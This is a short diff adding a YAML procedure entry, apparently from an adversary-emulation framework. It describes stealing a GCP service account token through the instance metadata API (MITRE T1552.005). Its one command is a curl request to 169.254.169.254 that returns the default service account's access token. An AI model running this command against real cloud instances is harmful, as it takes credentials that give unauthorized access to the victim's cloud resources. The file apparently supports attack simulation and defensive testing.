@@ -1,0 +1,17 @@
+name: Get GCP Service Account Token
+description: Get the GCP service account token from the metadata service
+tactic: Discovery
+techniques:
+  ["Unsecured Credentials: Cloud Instance Metadata API ", T1552.005]
+preconditions:
+  kind: System
+  # CSP: GCP
+procedures:
+  - key: GCP
+    tool: curl
+    command: >-
+      curl http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token -H "Metadata-Flavor: Google"
+effects: ["GCP.serviceAccountToken"]
+references:
+  - https://attack.mitre.org/techniques/T1552/005/
+  - https://hackingthe.cloud/gcp/general-knowledge/metadata_in_google_cloud_instances
